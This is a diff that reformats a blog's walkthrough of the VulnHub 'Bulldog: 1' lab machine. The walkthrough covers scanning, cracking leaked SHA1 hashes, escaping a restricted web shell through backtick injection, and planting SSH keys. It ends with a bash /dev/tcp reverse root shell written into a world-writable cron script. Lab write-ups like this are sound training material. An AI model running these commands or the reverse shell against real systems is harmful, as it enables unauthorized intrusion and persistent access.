@@ -94,15 +94,13 @@
     </header>
 
     <div class="entry-content">
-            <p><img class="align-left"
-src="/media/2017.11/1.png" alt="Bulldog homepage" width="162"></p>
+            <p><img alt="Bulldog homepage" class="align-left" src="/media/2017.11/1.png" width="162"/></p>
 <p>At the moment I have some times to work again on vulhub virtual machine. So here I picked
 the first one at the moment:
 <a href="https://www.vulnhub.com/entry/bulldog-1,211/">Bulldog: 1</a>
 A simple boot2root machine by <a href="https://twitter.com/frichette_n">Nick Frichette</a>.</p>
-<!-- PELICAN_END_SUMMARY -->
 
-<h2>Discovery</h2>
+<h2 id="discovery">Discovery</h2>
 <p>The MOTD of the machine give us its IP address so we can directly launch a nmap at it:</p>
 <div class="highlight"><pre><span></span>root@kalili:~# nmap -sSV 10.0.2.4
 
@@ -120,12 +118,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
 </pre></div>
-
-
 <p>There is a ssh service running on port 23 and two web servers on port 80 and
 8080. The server on both port seems to be the same and talks dogs photographies.</p>
-<h2>Web</h2>
-<p><img alt="Website screenshot" src="/media/2017.11/1.png"></p>
+<h2 id="web">Web</h2>
+<p><img alt="Website screenshot" src="/media/2017.11/1.png"/></p>
 <p>We run <code>dirb</code> on the web server on the port 80:</p>
 <div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">dirb</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="w"></span>
 
@@ -148,11 +144,9 @@ Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
 <span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.4</span><span class="o">/</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">1071</span><span class="p">)</span><span class="w"></span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
 </pre></div>
-
-
 <p>The result is the same on the port 8080</p>
 <p>The admin page present a django login interface.</p>
-<p><img alt="Django login page" src="/media/2017.11/2.png"></p>
+<p><img alt="Django login page" src="/media/2017.11/2.png"/></p>
 <p>The dev page contain the link to a web-shell and contact information with some hashes in html comments <code>view-source:http://10.0.2.4/dev/</code>:</p>
 <div class="highlight"><pre><span></span><span class="nv">Team</span> <span class="nv">Lead</span>: <span class="nv">alan</span>@<span class="nv">bulldogindustries</span>.<span class="nv">com</span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;!--</span><span class="mi">6515229</span><span class="nv">daf8dbdc8b89fed2e60f107433da5f2cb</span><span class="o">--&gt;</span>
 <span class="nv">Back</span><span class="o">-</span><span class="nv">up</span> <span class="nv">Team</span> <span class="nv">Lead</span>: <span class="nv">william</span>@<span class="nv">bulldogindustries</span>.<span class="nv">com</span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;!--</span><span class="mi">38882</span><span class="nv">f3b81f8f2bc47d9f3119155b05f954892fb</span><span class="o">--&gt;</span>
@@ -162,18 +156,14 @@ Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
 <span class="nv">Back</span> <span class="k">End</span>: <span class="nv">nick</span>@<span class="nv">bulldogindustries</span>.<span class="nv">com</span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;!--</span><span class="nv">ddf45997a7e18a25ad5f5cf222da64814dd060d5</span><span class="o">--&gt;</span>
 <span class="nv">Database</span>: <span class="nv">sarah</span>@<span class="nv">bulldogindustries</span>.<span class="nv">com</span><span class="o">&lt;</span><span class="nv">br</span><span class="o">&gt;&lt;!--</span><span class="nv">d8b8dd5e7f000b8dea26ef8428caf38c04466b3e</span><span class="o">--&gt;</span>
 </pre></div>
-
-
 <p>We launch john against the hashes:</p>
 <div class="highlight"><pre><span></span><span class="nv">root</span>@<span class="nv">kalili</span>:<span class="o">~/</span><span class="nv">bulldog</span># <span class="nv">john</span> <span class="nv">hashes</span> <span class="o">--</span><span class="nv">format</span><span class="o">=</span><span class="nv">Raw</span><span class="o">-</span><span class="nv">SHA1</span>
 <span class="nv">Using</span> <span class="nv">default</span> <span class="nv">input</span> <span class="nv">encoding</span>: <span class="nv">UTF</span><span class="o">-</span><span class="mi">8</span>
 <span class="nv">Loaded</span> <span class="mi">7</span> <span class="nv">password</span> <span class="nv">hashes</span> <span class="nv">with</span> <span class="nv">no</span> <span class="nv">different</span> <span class="nv">salts</span> <span class="ss">(</span><span class="nv">Raw</span><span class="o">-</span><span class="nv">SHA1</span> [<span class="nv">SHA1</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="nv">AVX</span> <span class="mi">4</span><span class="nv">x</span>]<span class="ss">)</span>
-<span class="nv">Press</span> <span class="s1">&#39;</span><span class="s">q</span><span class="s1">&#39;</span> <span class="nv">or</span> <span class="nv">Ctrl</span><span class="o">-</span><span class="nv">C</span> <span class="nv">to</span> <span class="nv">abort</span>, <span class="nv">almost</span> <span class="nv">any</span> <span class="nv">other</span> <span class="nv">key</span> <span class="k">for</span> <span class="nv">status</span>
+<span class="nv">Press</span> <span class="s1">'</span><span class="s">q</span><span class="s1">'</span> <span class="nv">or</span> <span class="nv">Ctrl</span><span class="o">-</span><span class="nv">C</span> <span class="nv">to</span> <span class="nv">abort</span>, <span class="nv">almost</span> <span class="nv">any</span> <span class="nv">other</span> <span class="nv">key</span> <span class="k">for</span> <span class="nv">status</span>
 <span class="nv">bulldog</span>          <span class="ss">(</span><span class="nv">nick</span><span class="ss">)</span>
 <span class="mi">1</span><span class="nv">g</span> <span class="mi">0</span>:<span class="mi">00</span>:<span class="mi">03</span>:<span class="mi">32</span>  <span class="mi">3</span><span class="o">/</span><span class="mi">3</span> <span class="mi">0</span>.<span class="mi">004714</span><span class="nv">g</span><span class="o">/</span><span class="nv">s</span> <span class="mi">12965</span><span class="nv">Kp</span><span class="o">/</span><span class="nv">s</span> <span class="mi">12965</span><span class="nv">Kc</span><span class="o">/</span><span class="nv">s</span> <span class="mi">77831</span><span class="nv">KC</span><span class="o">/</span><span class="nv">s</span> <span class="nv">hmj359t</span>..<span class="nv">hmj359l</span>
 </pre></div>
-
-
 <p>Nick use a weak password and it can be used to login into the Django admin interface but he has no access.</p>
 <p>[/media/2017.11/3.png]</p>
 <p>Nevertheless nick has access to the restricted web-shell</p>
@@ -182,33 +172,23 @@ Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
 <div class="highlight"><pre><span></span><span class="n">cat</span> <span class="n">bulldog</span><span class="o">/</span><span class="n">settings</span><span class="p">.</span><span class="n">py</span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
 <span class="o">#</span> <span class="k">SECURITY</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">keep</span> <span class="n">the</span> <span class="n">secret</span> <span class="k">key</span> <span class="n">used</span> <span class="k">in</span> <span class="n">production</span> <span class="n">secret</span><span class="o">!</span>
-<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s1">&#39;%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;u+o_g$yi83d*riq&#39;</span>
+<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s1">'%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;u+o_g$yi83d*riq'</span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="n">o</span>
 </pre></div>
-
-
 <p>And we can easily break out of the "jail" with the <code>echo</code> command:</p>
 <div class="highlight"><pre><span></span><span class="n">echo</span> <span class="ss">`id`</span>
 <span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">django</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">)</span>
 </pre></div>
-
-
 <p>Therefore we can create a directory <code>.ssh</code> inside the  django user home:</p>
 <div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">`</span><span class="n">mkdir</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">django</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">`</span>
 </pre></div>
-
-
 <p>And then echo our ssh public key inside (you need to change the filed size with the firefox inspector):</p>
-<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s1">&#39;ssh-rsa AAAAB3Nt/&lt;SNIP&gt;&#39;</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">django</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
+<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s1">'ssh-rsa AAAAB3Nt/&lt;SNIP&gt;'</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">django</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>
 </pre></div>
-
-
 <p>Then we got an interactive shell with ssh:</p>
 <div class="highlight"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">ldjango</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span> <span class="o">-</span><span class="n">p23</span>
 </pre></div>
-
-
-<h2>PrivEsc</h2>
+<h2 id="privesc">PrivEsc</h2>
 <p>By looking more into the users directory we discover that we have a read access on djangoadmin
 files and that a <code>.hiddenadmindirectory</code> is present with a note and an executable:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ahlR</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="w"></span>
@@ -232,7 +212,7 @@ files and that a <code>.hiddenadmindirectory</code> is present with a note and a
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">-- 1 bulldogadmin bulldogadmin   66 Aug 24 22:18 .selected_editor</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 bulldogadmin bulldogadmin    0 Aug 24 17:45 .sudo_as_admin_successful</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">-- 1 bulldogadmin bulldogadmin  217 Aug 24 18:20 .wget-hsts</span>
-<span class="nl">ls</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="s1">&#39;/home/bulldogadmin/.cache&#39;</span><span class="err">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w"></span>
+<span class="nl">ls</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="k">open</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="s1">'/home/bulldogadmin/.cache'</span><span class="err">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w"></span>
 
 <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bulldogadmin</span><span class="o">/</span><span class="p">.</span><span class="nl">hiddenadmindirectory</span><span class="p">:</span><span class="w"></span>
 <span class="n">total</span><span class="w"> </span><span class="mi">24</span><span class="n">K</span><span class="w"></span>
@@ -241,29 +221,23 @@ files and that a <code>.hiddenadmindirectory</code> is present with a note and a
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 bulldogadmin bulldogadmin 8.6K Aug 25 22:18 customPermissionApp</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">-- 1 bulldogadmin bulldogadmin  619 Sep 20 19:44 note</span>
 </pre></div>
-
-
-<h3>Reverse</h3>
+<h3 id="reverse">Reverse</h3>
 <p>The note's content is the following:</p>
 <div class="highlight"><pre><span></span><span class="nv">Nick</span>,
 
-<span class="nv">I</span><span class="s1">&#39;</span><span class="s">m working on the backend permission stuff. Listen, it</span><span class="s1">&#39;</span><span class="nv">s</span> <span class="nv">super</span> <span class="nv">prototype</span> <span class="nv">but</span> <span class="nv">I</span> <span class="nv">think</span> <span class="nv">it</span><span class="s1">&#39;</span><span class="s">s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!</span>
+<span class="nv">I</span><span class="s1">'</span><span class="s">m working on the backend permission stuff. Listen, it</span><span class="s1">'</span><span class="nv">s</span> <span class="nv">super</span> <span class="nv">prototype</span> <span class="nv">but</span> <span class="nv">I</span> <span class="nv">think</span> <span class="nv">it</span><span class="s1">'</span><span class="s">s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!</span>
 
-<span class="nv">It</span><span class="s1">&#39;</span><span class="s">s great stuff! Once I</span><span class="s1">&#39;</span><span class="nv">m</span> <span class="nv">finished</span> <span class="nv">with</span> <span class="nv">it</span>, <span class="nv">a</span> <span class="nv">hacker</span> <span class="nv">wouldn</span><span class="s1">&#39;</span><span class="s">t even be able to reverse it! Keep in mind that it</span><span class="s1">&#39;</span><span class="nv">s</span> <span class="nv">still</span> <span class="nv">a</span> <span class="nv">prototype</span> <span class="nv">right</span> <span class="nv">now</span>. <span class="nv">I</span> <span class="nv">am</span> <span class="nv">about</span> <span class="nv">to</span> <span class="nv">get</span> <span class="nv">it</span> <span class="nv">working</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">Django</span> <span class="nv">user</span> <span class="nv">account</span>. <span class="nv">I</span><span class="s1">&#39;</span><span class="s">m not sure how I</span><span class="s1">&#39;</span><span class="nv">ll</span> <span class="nv">implement</span> <span class="nv">it</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">others</span>. <span class="nv">Maybe</span> <span class="nv">the</span> <span class="nv">webserver</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nv">only</span> <span class="nv">one</span> <span class="nv">who</span> <span class="nv">needs</span> <span class="nv">to</span> <span class="nv">have</span> <span class="nv">root</span> <span class="nv">access</span> <span class="nv">sometimes</span>?
+<span class="nv">It</span><span class="s1">'</span><span class="s">s great stuff! Once I</span><span class="s1">'</span><span class="nv">m</span> <span class="nv">finished</span> <span class="nv">with</span> <span class="nv">it</span>, <span class="nv">a</span> <span class="nv">hacker</span> <span class="nv">wouldn</span><span class="s1">'</span><span class="s">t even be able to reverse it! Keep in mind that it</span><span class="s1">'</span><span class="nv">s</span> <span class="nv">still</span> <span class="nv">a</span> <span class="nv">prototype</span> <span class="nv">right</span> <span class="nv">now</span>. <span class="nv">I</span> <span class="nv">am</span> <span class="nv">about</span> <span class="nv">to</span> <span class="nv">get</span> <span class="nv">it</span> <span class="nv">working</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">Django</span> <span class="nv">user</span> <span class="nv">account</span>. <span class="nv">I</span><span class="s1">'</span><span class="s">m not sure how I</span><span class="s1">'</span><span class="nv">ll</span> <span class="nv">implement</span> <span class="nv">it</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">others</span>. <span class="nv">Maybe</span> <span class="nv">the</span> <span class="nv">webserver</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nv">only</span> <span class="nv">one</span> <span class="nv">who</span> <span class="nv">needs</span> <span class="nv">to</span> <span class="nv">have</span> <span class="nv">root</span> <span class="nv">access</span> <span class="nv">sometimes</span>?
 
 <span class="nv">Let</span> <span class="nv">me</span> <span class="nv">know</span> <span class="nv">what</span> <span class="nv">you</span> <span class="nv">think</span> <span class="nv">of</span> <span class="nv">it</span><span class="o">!</span>
 
 <span class="o">-</span><span class="nv">Ashley</span>
 </pre></div>
-
-
 <p>We copy the executable to make it our own and be able to execute it:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">bulldogadmin</span><span class="o">/</span><span class="p">.</span><span class="n">hiddenadmindirectory</span><span class="o">/</span><span class="n">customPermissionApp</span><span class="w"> </span><span class="p">.</span><span class="o">/</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="n">customPermissionApp</span><span class="w"></span>
 </pre></div>
-
-
 <p>Then it's reverse, but another lead was found during the reconnaissance for privilege escalation:</p>
-<h3>Cron</h3>
+<h3 id="cron">Cron</h3>
 <p>By looking at the cron files we also see that there is a runAV task:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">ahlR</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">*</span><span class="w"></span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r-- 1 root root  722 Apr  5  2016 /etc/crontab</span>
@@ -278,21 +252,15 @@ files and that a <code>.hiddenadmindirectory</code> is present with a note and a
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--r--  1 root root   54 Aug 25 22:05 runAV</span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
 </pre></div>
-
-
 <p>By digging in we found that:</p>
 <p>it run a script with root right every minute</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">runAV</span><span class="w"> </span>
 <span class="o">*/</span><span class="mi">1</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
 </pre></div>
-
-
 <p>the script is world writable:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"> </span>
 <span class="o">-</span><span class="n">rwxrwxrwx</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">157</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="mi">22</span><span class="err">:</span><span class="mi">12</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
 </pre></div>
-
-
 <p>that the script is just a place holder:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
 <span class="err">#!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span><span class="w"> </span><span class="n">python</span><span class="w"></span>
@@ -301,15 +269,11 @@ files and that a <code>.hiddenadmindirectory</code> is present with a note and a
 <span class="err">#</span><span class="w"> </span><span class="n">We</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">full</span><span class="w"> </span><span class="n">AV</span><span class="w"> </span><span class="n">here</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">vendor</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="n">making</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"></span>
 <span class="err">#</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Alan</span><span class="w"></span>
 </pre></div>
-
-
 <p>We can just get a reverse root shell by modifying the file:</p>
 <div class="highlight"><pre><span></span><span class="n">django</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="p">.</span><span class="n">hiddenAVDirectory</span><span class="o">/</span><span class="n">AVApplication</span><span class="p">.</span><span class="n">py</span><span class="w"></span>
 <span class="err">#!</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"></span>
 <span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.0.2.15</span><span class="o">/</span><span class="mi">4444</span><span class="w"> </span><span class="mi">0</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="w"></span>
 </pre></div>
-
-
 <p>And listen client side:</p>
 <div class="highlight"><pre><span></span><span class="nv">root</span>@<span class="nv">kalili</span>:<span class="o">~</span># <span class="nv">netcat</span> <span class="o">-</span><span class="nv">l</span> <span class="o">-</span><span class="nv">p</span> <span class="mi">4444</span>
 <span class="nv">bash</span>: <span class="nv">cannot</span> <span class="nv">set</span> <span class="nv">terminal</span> <span class="nv">process</span> <span class="nv">group</span> <span class="ss">(</span><span class="mi">2145</span><span class="ss">)</span>: <span class="nv">Inappropriate</span> <span class="nv">ioctl</span> <span class="k">for</span> <span class="nv">device</span>
@@ -320,27 +284,21 @@ files and that a <code>.hiddenadmindirectory</code> is present with a note and a
 <span class="nv">ls</span> <span class="o">/</span><span class="nv">root</span>
 <span class="nv">congrats</span>.<span class="nv">txt</span>
 <span class="nv">cat</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">congrats</span>.<span class="nv">txt</span>
-<span class="nv">Congratulations</span> <span class="nv">on</span> <span class="nv">completing</span> <span class="nv">this</span> <span class="nv">VM</span> :<span class="nv">D</span> <span class="nv">That</span> <span class="nv">wasn</span><span class="s1">&#39;</span><span class="s">t so bad was it?</span>
-<span class="nv">Let</span> <span class="nv">me</span> <span class="nv">know</span> <span class="nv">what</span> <span class="nv">you</span> <span class="nv">thought</span> <span class="nv">on</span> <span class="nv">twitter</span>, <span class="nv">I</span><span class="s1">&#39;</span><span class="s">m @frichette_n</span>
+<span class="nv">Congratulations</span> <span class="nv">on</span> <span class="nv">completing</span> <span class="nv">this</span> <span class="nv">VM</span> :<span class="nv">D</span> <span class="nv">That</span> <span class="nv">wasn</span><span class="s1">'</span><span class="s">t so bad was it?</span>
+<span class="nv">Let</span> <span class="nv">me</span> <span class="nv">know</span> <span class="nv">what</span> <span class="nv">you</span> <span class="nv">thought</span> <span class="nv">on</span> <span class="nv">twitter</span>, <span class="nv">I</span><span class="s1">'</span><span class="s">m @frichette_n</span>
 <span class="nv">As</span> <span class="nv">far</span> <span class="nv">as</span> <span class="nv">I</span> <span class="nv">know</span> <span class="nv">there</span> <span class="nv">are</span> <span class="nv">two</span> <span class="nv">ways</span> <span class="nv">to</span> <span class="nv">get</span> <span class="nv">root</span>. <span class="nv">Can</span> <span class="nv">you</span> <span class="nv">find</span> <span class="nv">the</span> <span class="nv">other</span> <span class="nv">one</span>?
 <span class="nv">Perhaps</span> <span class="nv">the</span> <span class="nv">sequel</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">more</span> <span class="nv">challenging</span>. <span class="k">Until</span> <span class="k">next</span> <span class="nv">time</span>, <span class="nv">I</span> <span class="nv">hope</span> <span class="nv">you</span> <span class="nv">enjoyed</span><span class="o">!</span>
 </pre></div>
-
-
 <p>Yeah the other one include reverse engineering which is not my thing :)</p>
 <p>In order to have a complete interactive shell we may just copy our ssh key on the root folder:</p>
 <div class="highlight"><pre><span></span><span class="n">cp</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">django</span><span class="p">.</span><span class="n">ssh</span> <span class="o">/</span><span class="n">root</span> <span class="o">-</span><span class="n">r</span>
 </pre></div>
-
-
 <p>And connect with ssh:</p>
 <div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="mf">10.0.2.4</span><span class="w"> </span><span class="o">-</span><span class="n">lroot</span><span class="w"> </span><span class="o">-</span><span class="n">p23</span><span class="w"></span>
 <span class="n">Welcome</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mf">16.04.3</span><span class="w"> </span><span class="n">LTS</span><span class="w"> </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="mf">4.4.0</span><span class="o">-</span><span class="mi">87</span><span class="o">-</span><span class="n">generic</span><span class="w"> </span><span class="n">x86_64</span><span class="p">)</span><span class="w"></span>
 <span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span>
 <span class="n">root</span><span class="nv">@bulldog</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"></span>
 </pre></div>
-
-
 <p>DONE.</p>
 <p>Thanks to <a href="https://twitter.com/@frichette_n">@frichette_n</a> for the machine and thanks to <a href="https://twitter.com/VulnHub">@vulnub</a>.</p>
     </div>
